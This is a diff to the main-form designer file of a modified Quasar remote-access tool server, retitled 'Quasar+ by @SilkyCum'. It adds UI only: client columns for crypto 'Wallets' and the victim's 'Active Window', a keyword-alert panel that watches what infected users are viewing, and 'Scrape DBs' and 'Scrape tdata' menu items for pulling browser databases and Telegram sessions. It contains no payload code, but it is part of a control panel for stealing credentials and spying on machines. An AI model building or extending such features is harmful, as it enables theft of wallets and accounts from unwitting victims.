@@ -73,20 +73,35 @@ namespace Quasar.Server.Forms
             this.listenToolStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
             this.lstClients = new Quasar.Server.Controls.AeroListView();
             this.hIP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.hTag = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hUserPC = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.hVersion = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hPhone = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hStatus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hUserStatus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hCountry = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hOS = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hAccountType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hWallets = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hActiveWindow = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.menuStrip = new System.Windows.Forms.MenuStrip();
+            this.txtSearch = new System.Windows.Forms.ToolStripTextBox();
             this.fIleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.closeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.pnlNotify = new System.Windows.Forms.Panel();
+            this.lstNotifyKeywords = new System.Windows.Forms.ListBox();
+            this.txtNotifyKeyword = new System.Windows.Forms.TextBox();
+            this.btnNotifyAdd = new System.Windows.Forms.Button();
+            this.btnNotifyRemove = new System.Windows.Forms.Button();
+            this.btnNotifyBack = new System.Windows.Forms.Button();
+            this.lstNotifyEvents = new System.Windows.Forms.ListView();
+            this.hNotifyUser = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hNotifyTime = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hNotifyKeyword = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hNotifyWindow = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.cmsNotifyEvents = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.cmsNotifyDashboardItem = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuStrip.SuspendLayout();
             this.tableLayoutPanel.SuspendLayout();
             this.statusStrip.SuspendLayout();
@@ -651,13 +666,19 @@ namespace Quasar.Server.Forms
             // 
             // tableLayoutPanel
             // 
-            this.tableLayoutPanel.ColumnCount = 1;
+            this.tableLayoutPanel.ColumnCount = 2;
             this.tableLayoutPanel.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100F));
+            this.tableLayoutPanel.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 240F));
             this.tableLayoutPanel.Controls.Add(this.statusStrip, 0, 2);
+            this.tableLayoutPanel.SetColumnSpan(this.statusStrip, 2);
             this.tableLayoutPanel.Controls.Add(this.lstClients, 0, 1);
+            this.tableLayoutPanel.SetColumnSpan(this.lstClients, 2);
             this.tableLayoutPanel.Controls.Add(this.menuStrip, 0, 0);
+            this.tableLayoutPanel.SetColumnSpan(this.menuStrip, 2);
+            this.tableLayoutPanel.Controls.Add(this.pnlNotify, 0, 1);
+            this.tableLayoutPanel.SetColumnSpan(this.pnlNotify, 2);
             this.tableLayoutPanel.Dock = System.Windows.Forms.DockStyle.Fill;
-            this.tableLayoutPanel.GrowStyle = System.Windows.Forms.TableLayoutPanelGrowStyle.FixedSize;
+            this.tableLayoutPanel.GrowStyle = System.Windows.Forms.TableLayoutPanelGrowStyle.AddRows;
             this.tableLayoutPanel.Location = new System.Drawing.Point(0, 0);
             this.tableLayoutPanel.Name = "tableLayoutPanel";
             this.tableLayoutPanel.RowCount = 3;
@@ -689,14 +710,15 @@ namespace Quasar.Server.Forms
             // 
             this.lstClients.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
             this.hIP,
-            this.hTag,
             this.hUserPC,
-            this.hVersion,
+            this.hPhone,
             this.hStatus,
             this.hUserStatus,
             this.hCountry,
             this.hOS,
-            this.hAccountType});
+            this.hAccountType,
+            this.hWallets,
+            this.hActiveWindow});
             this.lstClients.ContextMenuStrip = this.contextMenuStrip;
             this.lstClients.Dock = System.Windows.Forms.DockStyle.Fill;
             this.lstClients.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
@@ -711,24 +733,135 @@ namespace Quasar.Server.Forms
             this.lstClients.View = System.Windows.Forms.View.Details;
             this.lstClients.SelectedIndexChanged += new System.EventHandler(this.lstClients_SelectedIndexChanged);
             // 
+            // pnlNotify
+            // 
+            this.pnlNotify.Controls.Add(this.btnNotifyBack);
+            this.pnlNotify.Controls.Add(this.btnNotifyRemove);
+            this.pnlNotify.Controls.Add(this.btnNotifyAdd);
+            this.pnlNotify.Controls.Add(this.txtNotifyKeyword);
+            this.pnlNotify.Controls.Add(this.lstNotifyEvents);
+            this.pnlNotify.Controls.Add(this.lstNotifyKeywords);
+            this.pnlNotify.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.pnlNotify.Location = new System.Drawing.Point(3, 28);
+            this.pnlNotify.Name = "pnlNotify";
+            this.pnlNotify.Size = new System.Drawing.Size(1016, 405);
+            this.pnlNotify.TabIndex = 4;
+            this.pnlNotify.Visible = false;
+            // 
+            // lstNotifyKeywords
+            // 
+            this.lstNotifyKeywords.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+                        | System.Windows.Forms.AnchorStyles.Left)));
+            this.lstNotifyKeywords.IntegralHeight = false;
+            this.lstNotifyKeywords.Location = new System.Drawing.Point(6, 6);
+            this.lstNotifyKeywords.Name = "lstNotifyKeywords";
+            this.lstNotifyKeywords.Size = new System.Drawing.Size(220, 360);
+            this.lstNotifyKeywords.TabIndex = 0;
+            // 
+            // txtNotifyKeyword
+            // 
+            this.txtNotifyKeyword.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.txtNotifyKeyword.Location = new System.Drawing.Point(6, 372);
+            this.txtNotifyKeyword.Name = "txtNotifyKeyword";
+            this.txtNotifyKeyword.Size = new System.Drawing.Size(220, 22);
+            this.txtNotifyKeyword.TabIndex = 1;
+            // 
+            // btnNotifyAdd
+            // 
+            this.btnNotifyAdd.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.btnNotifyAdd.Location = new System.Drawing.Point(232, 371);
+            this.btnNotifyAdd.Name = "btnNotifyAdd";
+            this.btnNotifyAdd.Size = new System.Drawing.Size(75, 23);
+            this.btnNotifyAdd.TabIndex = 2;
+            this.btnNotifyAdd.Text = "Add";
+            this.btnNotifyAdd.UseVisualStyleBackColor = true;
+            this.btnNotifyAdd.Click += new System.EventHandler(this.btnNotifyAdd_Click);
+            // 
+            // btnNotifyRemove
+            // 
+            this.btnNotifyRemove.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.btnNotifyRemove.Location = new System.Drawing.Point(313, 371);
+            this.btnNotifyRemove.Name = "btnNotifyRemove";
+            this.btnNotifyRemove.Size = new System.Drawing.Size(75, 23);
+            this.btnNotifyRemove.TabIndex = 3;
+            this.btnNotifyRemove.Text = "Remove";
+            this.btnNotifyRemove.UseVisualStyleBackColor = true;
+            this.btnNotifyRemove.Click += new System.EventHandler(this.btnNotifyRemove_Click);
+            // 
+            // btnNotifyBack
+            // 
+            this.btnNotifyBack.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
+            this.btnNotifyBack.Location = new System.Drawing.Point(908, 371);
+            this.btnNotifyBack.Name = "btnNotifyBack";
+            this.btnNotifyBack.Size = new System.Drawing.Size(100, 23);
+            this.btnNotifyBack.TabIndex = 5;
+            this.btnNotifyBack.Text = "Dashboard";
+            this.btnNotifyBack.UseVisualStyleBackColor = true;
+            this.btnNotifyBack.Click += new System.EventHandler(this.btnNotifyBack_Click);
+            // 
+            // lstNotifyEvents
+            // 
+            this.lstNotifyEvents.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+                        | System.Windows.Forms.AnchorStyles.Left) 
+                        | System.Windows.Forms.AnchorStyles.Right)));
+            this.lstNotifyEvents.ContextMenuStrip = this.cmsNotifyEvents;
+            this.lstNotifyEvents.Location = new System.Drawing.Point(232, 6);
+            this.lstNotifyEvents.Name = "lstNotifyEvents";
+            this.lstNotifyEvents.FullRowSelect = true;
+            this.lstNotifyEvents.Size = new System.Drawing.Size(776, 360);
+            this.lstNotifyEvents.TabIndex = 4;
+            this.lstNotifyEvents.UseCompatibleStateImageBehavior = false;
+            this.lstNotifyEvents.View = System.Windows.Forms.View.Details;
+            this.lstNotifyEvents.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] { this.hNotifyUser, this.hNotifyTime, this.hNotifyKeyword, this.hNotifyWindow });
+            // 
+            // hNotifyUser
+            // 
+            this.hNotifyUser.Text = "User";
+            this.hNotifyUser.Width = 160;
+            // 
+            // hNotifyTime
+            // 
+            this.hNotifyTime.Text = "Time";
+            this.hNotifyTime.Width = 160;
+            // 
+            // hNotifyKeyword
+            // 
+            this.hNotifyKeyword.Text = "Keyword";
+            this.hNotifyKeyword.Width = 160;
+            // 
+            // hNotifyWindow
+            // 
+            this.hNotifyWindow.Text = "Active Window";
+            this.hNotifyWindow.Width = 260;
+            // 
+            // cmsNotifyEvents
+            // 
+            this.cmsNotifyEvents.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.cmsNotifyDashboardItem});
+            this.cmsNotifyEvents.Name = "cmsNotifyEvents";
+            this.cmsNotifyEvents.Size = new System.Drawing.Size(137, 26);
+            // 
+            // cmsNotifyDashboardItem
+            // 
+            this.cmsNotifyDashboardItem.Name = "cmsNotifyDashboardItem";
+            this.cmsNotifyDashboardItem.Size = new System.Drawing.Size(136, 22);
+            this.cmsNotifyDashboardItem.Text = "Go-to client";
+            this.cmsNotifyDashboardItem.Click += new System.EventHandler(this.cmsNotifyDashboardItem_Click);
             // hIP
             // 
             this.hIP.Text = "IP Address";
             this.hIP.Width = 112;
             // 
-            // hTag
-            // 
-            this.hTag.Text = "Tag";
-            // 
+            
             // hUserPC
             // 
             this.hUserPC.Text = "User@PC";
             this.hUserPC.Width = 175;
             // 
-            // hVersion
+            // hPhone
             // 
-            this.hVersion.Text = "Version";
-            this.hVersion.Width = 66;
+            this.hPhone.Text = "Phone";
+            this.hPhone.Width = 60;
             // 
             // hStatus
             // 
@@ -755,9 +888,19 @@ namespace Quasar.Server.Forms
             this.hAccountType.Text = "Account Type";
             this.hAccountType.Width = 100;
             // 
+            // hWallets
+            // 
+            this.hWallets.Text = "Wallets";
+            this.hWallets.Width = 80;
+            // 
+            // hActiveWindow
+            // 
+            this.hActiveWindow.Text = "Active Window";
+            this.hActiveWindow.Width = 180;
+            // 
             // menuStrip
             // 
-            this.menuStrip.Dock = System.Windows.Forms.DockStyle.None;
+            this.menuStrip.Dock = System.Windows.Forms.DockStyle.Fill;
             this.menuStrip.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.menuStrip.ImageScalingSize = new System.Drawing.Size(24, 24);
             this.menuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
@@ -769,6 +912,45 @@ namespace Quasar.Server.Forms
             this.menuStrip.Name = "menuStrip";
             this.menuStrip.Size = new System.Drawing.Size(216, 25);
             this.menuStrip.TabIndex = 2;
+            // 
+            // windowsNotifyToolStripMenuItem
+            // 
+            this.windowsNotifyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.windowsNotifyToolStripMenuItem.Name = "windowsNotifyToolStripMenuItem";
+            this.windowsNotifyToolStripMenuItem.Size = new System.Drawing.Size(111, 21);
+            this.windowsNotifyToolStripMenuItem.Text = "Windows Notify";
+            this.windowsNotifyToolStripMenuItem.Click += new System.EventHandler(this.windowsNotifyToolStripMenuItem_Click);
+            this.menuStrip.Items.Insert(3, this.windowsNotifyToolStripMenuItem);
+            // top-level Extra menu (separate instance from context menu item)
+            this.extraTopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.extraTopToolStripMenuItem.Name = "extraTopToolStripMenuItem";
+            this.extraTopToolStripMenuItem.Size = new System.Drawing.Size(46, 21);
+            this.extraTopToolStripMenuItem.Text = "Extra";
+            this.scrapeDbsTopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.scrapeTdataTopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.scrapeDbsTopToolStripMenuItem.Name = "scrapeDbsTopToolStripMenuItem";
+            this.scrapeDbsTopToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.scrapeDbsTopToolStripMenuItem.Text = "Scrape DBs";
+            this.scrapeDbsTopToolStripMenuItem.Click += new System.EventHandler(this.scrapeDbsToolStripMenuItem_Click);
+            //
+            // scrapeTdataTopToolStripMenuItem
+            //
+            this.scrapeTdataTopToolStripMenuItem.Name = "scrapeTdataTopToolStripMenuItem";
+            this.scrapeTdataTopToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.scrapeTdataTopToolStripMenuItem.Text = "Scrape tdata";
+            this.scrapeTdataTopToolStripMenuItem.Click += new System.EventHandler(this.scrapeTdataTopToolStripMenuItem_Click);
+            this.extraTopToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] { this.scrapeDbsTopToolStripMenuItem, this.scrapeTdataTopToolStripMenuItem });
+            this.menuStrip.Items.Insert(4, this.extraTopToolStripMenuItem);
+            // 
+            // txtSearch
+            // 
+            this.txtSearch.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
+            this.txtSearch.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.txtSearch.Name = "txtSearch";
+            this.txtSearch.Size = new System.Drawing.Size(160, 25);
+            this.txtSearch.ToolTipText = "Search clients";
+            this.txtSearch.TextChanged += new System.EventHandler(this.txtSearch_TextChanged);
+            this.menuStrip.Items.Add(this.txtSearch);
             // 
             // fIleToolStripMenuItem
             // 
@@ -811,15 +993,15 @@ namespace Quasar.Server.Forms
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
-            this.ClientSize = new System.Drawing.Size(1022, 458);
+            this.ClientSize = new System.Drawing.Size(1280, 520);
             this.Controls.Add(this.tableLayoutPanel);
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.ForeColor = System.Drawing.Color.Black;
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
-            this.MinimumSize = new System.Drawing.Size(680, 415);
+            this.MinimumSize = new System.Drawing.Size(900, 520);
             this.Name = "FrmMain";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "Quasar - Connected: 0";
+            this.Text = "Quasar+ by @SilkyCum - Connected: 0";
             this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmMain_FormClosing);
             this.Load += new System.EventHandler(this.FrmMain_Load);
             this.contextMenuStrip.ResumeLayout(false);
@@ -836,14 +1018,14 @@ namespace Quasar.Server.Forms
         #endregion
 
         private System.Windows.Forms.ColumnHeader hIP;
-        private System.Windows.Forms.ColumnHeader hVersion;
+        
         private System.Windows.Forms.ColumnHeader hCountry;
         private System.Windows.Forms.ColumnHeader hOS;
         private System.Windows.Forms.ContextMenuStrip contextMenuStrip;
         private System.Windows.Forms.ToolStripMenuItem connectionToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem reconnectToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem disconnectToolStripMenuItem;
-        private System.Windows.Forms.ColumnHeader hTag;
+        
         private System.Windows.Forms.ImageList imgFlags;
         private System.Windows.Forms.ToolStripMenuItem systemToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader hStatus;
@@ -853,6 +1035,9 @@ namespace Quasar.Server.Forms
         private System.Windows.Forms.ToolStripMenuItem taskManagerToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader hAccountType;
+        private System.Windows.Forms.ColumnHeader hWallets;
+        private System.Windows.Forms.ColumnHeader hActiveWindow;
+        private System.Windows.Forms.ColumnHeader hPhone;
         private System.Windows.Forms.ToolStripMenuItem systemInformationToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader hUserStatus;
         private System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem;
@@ -878,7 +1063,9 @@ namespace Quasar.Server.Forms
         private System.Windows.Forms.ToolStripMenuItem closeToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem settingsToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem builderToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem windowsNotifyToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem aboutToolStripMenuItem;
+        private System.Windows.Forms.ToolStripTextBox txtSearch;
         private System.Windows.Forms.StatusStrip statusStrip;
         private System.Windows.Forms.ToolStripStatusLabel listenToolStripStatusLabel;
         private System.Windows.Forms.ToolStripMenuItem connectionsToolStripMenuItem;
@@ -890,6 +1077,24 @@ namespace Quasar.Server.Forms
         private System.Windows.Forms.ToolStripMenuItem webFileToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem elevateClientPermissionsToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem2;
+        private System.Windows.Forms.ToolStripMenuItem extraToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem scrapeDbsToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem extraTopToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem scrapeDbsTopToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem scrapeTdataTopToolStripMenuItem;
+        private System.Windows.Forms.ContextMenuStrip cmsNotifyEvents;
+        private System.Windows.Forms.ToolStripMenuItem cmsNotifyDashboardItem;
+        private System.Windows.Forms.Panel pnlNotify;
+        private System.Windows.Forms.ListBox lstNotifyKeywords;
+        private System.Windows.Forms.TextBox txtNotifyKeyword;
+        private System.Windows.Forms.Button btnNotifyAdd;
+        private System.Windows.Forms.Button btnNotifyRemove;
+        private System.Windows.Forms.Button btnNotifyBack;
+        private System.Windows.Forms.ListView lstNotifyEvents;
+        private System.Windows.Forms.ColumnHeader hNotifyUser;
+        private System.Windows.Forms.ColumnHeader hNotifyTime;
+        private System.Windows.Forms.ColumnHeader hNotifyKeyword;
+        private System.Windows.Forms.ColumnHeader hNotifyWindow;
     }
 }
 
